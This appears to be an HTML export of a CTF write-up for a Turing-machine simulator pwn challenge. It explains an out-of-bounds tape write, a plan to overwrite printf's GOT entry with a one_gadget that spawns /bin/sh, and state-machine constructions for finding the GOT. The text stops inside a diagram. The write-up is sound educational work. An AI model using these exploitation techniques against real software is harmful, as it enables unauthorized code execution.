<!DOCTYPE html><html><head>
      <title>adversarial_beaver</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.css">
      
      
      
      
      
      <style>
      code[class*=language-],pre[class*=language-]{color:#333;background:0 0;font-family:Consolas,"Liberation Mono",Menlo,Courier,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.4;-moz-tab-size:8;-o-tab-size:8;tab-size:8;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:.8em;overflow:auto;border-radius:3px;background:#f5f5f5}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal;background:#f5f5f5}.token.blockquote,.token.comment{color:#969896}.token.cdata{color:#183691}.token.doctype,.token.macro.property,.token.punctuation,.token.variable{color:#333}.token.builtin,.token.important,.token.keyword,.token.operator,.token.rule{color:#a71d5d}.token.attr-value,.token.regex,.token.string,.token.url{color:#183691}.token.atrule,.token.boolean,.token.code,.token.command,.token.constant,.token.entity,.token.number,.token.property,.token.symbol{color:#0086b3}.token.prolog,.token.selector,.token.tag{color:#63a35c}.token.attr-name,.token.class,.token.class-name,.token.function,.token.id,.token.namespace,.token.pseudo-class,.token.pseudo-element,.token.url-reference .token.variable{color:#795da3}.token.entity{cursor:help}.token.title,.token.title .token.punctuation{font-weight:700;color:#1d3e81}.token.list{color:#ed6a43}.token.inserted{background-color:#eaffea;color:#55a532}.token.deleted{background-color:#ffecec;color:#bd2c00}.token.bold{font-weight:700}.token.italic{font-style:italic}.language-json .token.property{color:#183691}.language-markup .token.tag .token.punctuation{color:#333}.language-css .token.function,code.language-css{color:#0086b3}.language-yaml .token.atrule{color:#63a35c}code.language-yaml{color:#183691}.language-ruby .token.function{color:#333}.language-markdown .token.url{color:#795da3}.language-makefile .token.symbol{color:#795da3}.language-makefile .token.variable{color:#183691}.language-makefile .token.builtin{color:#0086b3}.language-bash .token.keyword{color:#0086b3}pre[data-line]{position:relative;padding:1em 0 1em 3em}pre[data-line] .line-highlight-wrapper{position:absolute;top:0;left:0;background-color:transparent;display:block;width:100%}pre[data-line] .line-highlight{position:absolute;left:0;right:0;padding:inherit 0;margin-top:1em;background:hsla(24,20%,50%,.08);background:linear-gradient(to right,hsla(24,20%,50%,.1) 70%,hsla(24,20%,50%,0));pointer-events:none;line-height:inherit;white-space:pre}pre[data-line] .line-highlight:before,pre[data-line] .line-highlight[data-end]:after{content:attr(data-start);position:absolute;top:.4em;left:.6em;min-width:1em;padding:0 .5em;background-color:hsla(24,20%,50%,.4);color:#f4f1ef;font:bold 65%/1.5 sans-serif;text-align:center;vertical-align:.3em;border-radius:999px;text-shadow:none;box-shadow:0 1px #fff}pre[data-line] .line-highlight[data-end]:after{content:attr(data-end);top:auto;bottom:.4em}html body{font-family:'Helvetica Neue',Helvetica,'Segoe UI',Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ol,html body>ul{margin-bottom:16px}html body ol,html body ul{padding-left:2em}html body ol.no-list,html body ul.no-list{padding:0;list-style-type:none}html body ol ol,html body ol ul,html body ul ol,html body ul ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:700;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::after,html body code::before{letter-spacing:-.2em;content:'\00a0'}html body pre>code{padding:0;margin:0;word-break:normal;white-space:pre;background:0 0;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:after,html body pre code:before,html body pre tt:after,html body pre tt:before{content:normal}html body blockquote,html body dl,html body ol,html body p,html body pre,html body ul{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body code,html body pre{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview ul{list-style:disc}.markdown-preview ul ul{list-style:circle}.markdown-preview ul ul ul{list-style:square}.markdown-preview ol{list-style:decimal}.markdown-preview ol ol,.markdown-preview ul ol{list-style-type:lower-roman}.markdown-preview ol ol ol,.markdown-preview ol ul ol,.markdown-preview ul ol ol,.markdown-preview ul ul ol{list-style-type:lower-alpha}.markdown-preview .newpage,.markdown-preview .pagebreak{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center!important}.markdown-preview:not([data-for=preview]) .code-chunk .code-chunk-btn-group{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .status{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .output-div{margin-bottom:16px}.markdown-preview .md-toc{padding:0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link div,.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}.markdown-preview .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0;min-height:100vh}@media screen and (min-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{font-size:14px!important;padding:1em}}@media print{html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc{padding:0 16px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link div,html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% - 300px);padding:2em calc(50% - 457px - 300px / 2);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
/* Please visit the URL below for more information: */
/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */

      </style>
      <!-- The content below will be included at the end of the <head> element. --><script type="text/javascript">
  document.addEventListener("DOMContentLoaded", function () {
    // your code here
  });
</script></head><body for="html-export">
    
    
      <div class="crossnote markdown-preview  ">
      
<h1 id="adversarial-beaver">Adversarial Beaver </h1>
<h2 id="setup">Setup </h2>
<blockquote>
<p>It's so amazing how they <a href="https://www.youtube.com/watch?v=rmx3FBPzDuk">solved BB-5</a>.</p>
<p>Let's see how well each team can do on BB-100!</p>
</blockquote>
<p>Category: Pwn<br>
Final solve count: 6<br>
Final point value: 999<br>
Solved by: Explosiontime202</p>
<h2 id="overview">Overview </h2>
<p>The challenge implements a simulator for a binary turing machine. It has at most <code>100</code> state and one HALT state, which always has id zero. All transitions can be specified by the user. The simulation calculates the number of steps taken before halting. To prevent infinite turing machines from running for ever, a 10 seconds timeout is implemented.</p>
<p>Every state has two transitions, one for every possible symbol (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∈</mo><mo stretchy="false">{</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\in \{0, 1\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose">}</span></span></span></span>) at the current position on the tape. To denote a transition, the following notation based on Python tuples is used: <code>(symbol, direction, next_state)</code></p>
<ul>
<li>symbol: The symbol put on the tape if the transition is taken.</li>
<li>direction: Should the curser be moved to the <strong>L</strong>eft or the <strong>R</strong>ight.</li>
<li>next_state: ID of the next state.</li>
</ul>
<p>The tape of the machine is <code>10005</code> bytes long, but there are no bounds checks whatsoever. Thus, writing beyond and in front of the memory of the tape is possible. Funnily, a self-modifying turing machine would be possible.</p>
<p>The binary has the following security measures:</p>
<pre data-role="codeBlock" data-info="" class="language-text"><code>RELRO:      No RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
</code></pre><p>Everything is far so normal, except that there is no RELRO, which immediately points towards <code>.fini_array</code> or <code>.got</code> overwrites.</p>
<h2 id="exploit">Exploit </h2>
<h3 id="target">Target </h3>
<p>For this exploit the <code>printf</code> pointer in the GOT is the target because it will be used to print the score of the turing machine after it has halted. We want to overwrite it with a one gadget. To find that we used <a href="https://github.com/david942j/one_gadget">david942j's one_gadget</a>. It finds multiple gadget, but for only one the requirements are fulfilled.</p>
<pre data-role="codeBlock" data-info="" class="language-text"><code>0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
</code></pre><img src="https://i.imgflip.com/9vzyzt.jpg">
<h3 id="the-search-for-godt">The search for GO<s>D</s>T </h3>
<p>The tape is behind the GOT. So to overwrite it, we have to go to the left. To avoid changing anything important while traveling towards the GOT, every bit is replaced with itself. That could be achieved by the following transitions: <code>[(0, L, state + 1), (1, L, state + 1)]</code></p>
<p>But we also need to stop. To do that, we choose a unique value before the GOT which always can be detected using the turing machine. For every bit of the value, we need one state, so the value should not be that too large or we run out of states.</p>
<h5 id="wrong-naive-search_for-construction"><s>Wrong</s> Naive search_for construction </h5>
<p>Let's start with the naive construction. Let the value have a length <code>l</code>. As we want to go to the left, have to start detecting at the MSB. In this section, talking about prefix and suffixes is in relation to the binary representation of the values and reading from MSB to LSB.</p>
<p>State <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mi>k</mi><mo>&lt;</mo><mi>l</mi></mrow><annotation encoding="application/x-tex">0 \leq k &lt; l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span> represents that a <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> bit prefix of the value has been parsed and has transitions <code>[(0, L, bit == 0 ? (k + 1) : 0), (0, L, bit == 0 ? (k + 1) : 0)]</code>. That means if the correct bit to extend the prefix is parsed, we switch to the next state, else restart.</p>
<p>As mentioned, this is the naive version and naive is often wrong. So in this case. The construction does not work if a value is being parsed which also contains a (shorter) prefix of itself. For example, for value <code>0b10111</code>, when <code>0b101</code> has already been parsed and now a <code>0</code> would be the next bit on the tape, we would switch to the start state. But, <code>0b10</code> would be a valid prefix and we should switch to state 2. Finding that misconception took an awful long time...</p>
<p>You can see a diagram for the <em>wrong</em> construction below.</p>
<figure>
<img src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB3aWR0aD0iNzQ3cHQiIGhlaWdodD0iMTc3cHQiIHZpZXdCb3g9IjAuMDAgMC4wMCA3NDcuMjYgMTc3LjAzIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KPGcgaWQ9ImdyYXBoMCIgY2xhc3M9ImdyYXBoIiB0cmFuc2Zvcm09InNjYWxlKDEgMSkgcm90YXRlKDApIHRyYW5zbGF0ZSg0IDE3My4wMykiPgo8dGl0bGU+VHVyaW5nTWFjaGluZTwvdGl0bGU+Cjxwb2x5Z29uIGZpbGw9IndoaXRlIiBzdHJva2U9Im5vbmUiIHBvaW50cz0iLTQsNCAtNCwtMTczLjAzIDc0My4yNiwtMTczLjAzIDc0My4yNiw0IC00LDQiLz4KPCEtLSBxMCAtLT4KPGcgaWQ9Im5vZGUxIiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xMDwvdGl0bGU+CjxlbGxpcHNlIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGN4PSIyNyIgY3k9Ii05MyIgcng9IjI3IiByeT0iMTgiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMjciIHk9Ii04OC44IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPnEwPC90ZXh0Pgo8L2c+CjwhLS0gcTAmIzQ1OyZndDtxMCAtLT4KPGcgaWQ9ImVkZ2UxIiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMC0mZ3Q7cTA8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMTUuMDYsLTEwOS4yOUMxMi4xOCwtMTE5LjM5IDE2LjE2LC0xMjkgMjcsLTEyOSAzMy40NCwtMTI5IDM3LjQ2LC0xMjUuNjEgMzkuMDUsLTEyMC43NCIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSI0Mi41NiwtMTIwLjc3IDM4Ljk2LC0xMTAuOCAzNS41NiwtMTIwLjg0IDQyLjU2LC0xMjAuNzciLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMjciIHk9Ii0xMzMuMiIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAwLCBMPC90ZXh0Pgo8L2c+CjwhLS0gcTEgLS0+CjxnIGlkPSJub2RlMiIgY2xhc3M9Im5vZGUiPgo8dGl0bGU+cTE8L3RpdGxlPgo8ZWxsaXBzZSBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBjeD0iMTY0LjA1IiBjeT0iLTE0NiIgcng9IjI3IiByeT0iMTgiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMTY0LjA1IiB5PSItMTQxLjgiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+cTE8L3RleHQ+CjwvZz4KPCEtLSBxMCYjNDU7Jmd0O3ExIC0tPgo8ZyBpZD0iZWRnZTIiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnEwLSZndDtxMTwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik0zNy4zMSwtMTA5Ljg3QzQ0LjkyLC0xMjEuNzkgNTYuODcsLTEzNi44NyA3MiwtMTQ0IDg4LjczLC0xNTEuODkgMTA5LjE5LC0xNTIuOTggMTI2LjQ3LC0xNTEuODUiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iMTI2LjcyLC0xNTUuMzQgMTM2LjM0LC0xNTAuOSAxMjYuMDUsLTE0OC4zNyAxMjYuNzIsLTE1NS4zNCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI5NS41MyIgeT0iLTE1Ni40MyIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4xIOKGkiAxLCBMPC90ZXh0Pgo8L2c+CjwhLS0gcTEmIzQ1OyZndDtxMCAtLT4KPGcgaWQ9ImVkZ2U0IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMS0mZ3Q7cTA8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMTQyLjc4LC0xMzQuNjRDMTM1LjQzLC0xMzAuNzUgMTI2Ljk4LC0xMjYuNTQgMTE5LjA1LC0xMjMuMiAxMDAuOTMsLTExNS41NSA4MC4xNCwtMTA4LjUzIDYzLjAxLC0xMDMuMTkiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iNjQuMzgsLTk5Ljk1IDUzLjc5LC0xMDAuMzcgNjIuMzMsLTEwNi42NCA2NC4zOCwtOTkuOTUiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iOTUuNTMiIHk9Ii0xMjcuNCIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4xIOKGkiAxLCBMPC90ZXh0Pgo8L2c+CjwhLS0gcTIgLS0+CjxnIGlkPSJub2RlMyIgY2xhc3M9Im5vZGUiPgo8dGl0bGU+cTI8L3RpdGxlPgo8ZWxsaXBzZSBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBjeD0iMzAxLjEiIGN5PSItOTMiIHJ4PSIyNyIgcnk9IjE4Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjMwMS4xIiB5PSItODguOCIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj5xMjwvdGV4dD4KPC9nPgo8IS0tIHExJiM0NTsmZ3Q7cTIgLS0+CjxnIGlkPSJlZGdlMyIgY2xhc3M9ImVkZ2UiPgo8dGl0bGU+cTEtJmd0O3EyPC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTE4Ny45NiwtMTM3LjAxQzIwOS42MywtMTI4LjUxIDI0Mi4zOSwtMTE1LjY1IDI2Ni45MSwtMTA2LjAzIi8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjI2OC4wOSwtMTA5LjMyIDI3Ni4xMiwtMTAyLjQxIDI2NS41NCwtMTAyLjgxIDI2OC4wOSwtMTA5LjMyIi8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjIzMi41OCIgeT0iLTEzMS41NCIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAwLCBMPC90ZXh0Pgo8L2c+CjwhLS0gcTImIzQ1OyZndDtxMCAtLT4KPGcgaWQ9ImVkZ2U1IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMi0mZ3Q7cTA8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMjczLjY5LC05M0MyMjUuMTIsLTkzIDEyMS40NywtOTMgNjUuNTgsLTkzIi8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjY1LjYsLTg5LjUgNTUuNiwtOTMgNjUuNiwtOTYuNSA2NS42LC04OS41Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjE2NC4wNSIgeT0iLTk3LjIiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MCDihpIgMCwgTDwvdGV4dD4KPC9nPgo8IS0tIHEzIC0tPgo8ZyBpZD0ibm9kZTQiIGNsYXNzPSJub2RlIj4KPHRpdGxlPnEzPC90aXRsZT4KPGVsbGlwc2UgZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgY3g9IjQzOC4xNiIgY3k9Ii00OCIgcng9IjI3IiByeT0iMTgiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iNDM4LjE2IiB5PSItNDMuOCIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj5xMzwvdGV4dD4KPC9nPgo8IS0tIHEyJiM0NTsmZ3Q7cTMgLS0+CjxnIGlkPSJlZGdlNiIgY2xhc3M9ImVkZ2UiPgo8dGl0bGU+cTItJmd0O3EzPC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTMyNS45NCwtODUuMDZDMzQ3LjI1LC03Ny45NiAzNzguNzMsLTY3LjQ3IDQwMi43NywtNTkuNDYiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iNDAzLjc0LC02Mi44MiA0MTIuMTIsLTU2LjM0IDQwMS41MywtNTYuMTggNDAzLjc0LC02Mi44MiIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSIzNjkuNjMiIHk9Ii04MS4zNiIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4xIOKGkiAxLCBMPC90ZXh0Pgo8L2c+CjwhLS0gcTMmIzQ1OyZndDtxMCAtLT4KPGcgaWQ9ImVkZ2U3IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMy0mZ3Q7cTA8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNNDExLjE1LC01MC42OEMzNjguNzksLTU1LjA3IDI4Mi4yOCwtNjQuMTEgMjA5LjA1LC03Mi4yIDE1OS4yNSwtNzcuNyAxMDEuNzgsLTg0LjM2IDY1LjE5LC04OC42MyIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSI2NS4xMSwtODUuMTIgNTUuNTgsLTg5Ljc2IDY1LjkyLC05Mi4wNyA2NS4xMSwtODUuMTIiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMjMyLjU4IiB5PSItNzYuNCIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAwLCBMPC90ZXh0Pgo8L2c+CjwhLS0gcTQgLS0+CjxnIGlkPSJub2RlNSIgY2xhc3M9Im5vZGUiPgo8dGl0bGU+cTQ8L3RpdGxlPgo8ZWxsaXBzZSBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBjeD0iNTc1LjIxIiBjeT0iLTE4IiByeD0iMjciIHJ5PSIxOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI1NzUuMjEiIHk9Ii0xMy44IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPnE0PC90ZXh0Pgo8L2c+CjwhLS0gcTMmIzQ1OyZndDtxNCAtLT4KPGcgaWQ9ImVkZ2U4IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMy0mZ3Q7cTQ8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNNDY0LjI0LC00Mi40M0M0ODQuOTksLTM3LjgyIDUxNC43NCwtMzEuMjEgNTM4LjA2LC0yNi4wMyIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSI1MzguNzgsLTI5LjQ2IDU0Ny43OCwtMjMuODcgNTM3LjI2LC0yMi42MiA1MzguNzgsLTI5LjQ2Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjUwNi42OCIgeT0iLTQxLjY0IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjEg4oaSIDEsIEw8